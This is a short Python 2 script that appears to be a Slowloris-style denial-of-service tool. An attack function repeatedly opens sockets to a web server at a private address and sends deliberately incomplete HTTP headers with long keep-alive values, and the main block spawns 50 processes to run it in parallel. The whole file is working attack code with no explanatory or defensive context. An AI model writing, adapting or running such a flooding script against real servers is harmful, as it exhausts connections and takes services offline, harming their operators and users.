#-*- coding:utf-8 -*-
import socket,multiprocessing,sys


def attack():
    while True:
        sock = socket.socket()
        header = "GET index.php HTTP/1.1\r\nAccept: text/html\r\nHost: 192.168.1.106\r\nKeep-Alive: 99999\r\nConnection: keep-alive\r\n"#.format(ip)
        try:
            sock.connect(("192.168.1.106", 80))
            print 'connected'
            sock.send(header)
            print 'header sended'
            sock.recv(204800)
            sock.recv(204800)
        except:
            print 'Host recusou as conexoes'

if __name__ == '__main__':
    for i in range(50):
        multiprocessing.Process(target=attack).start()
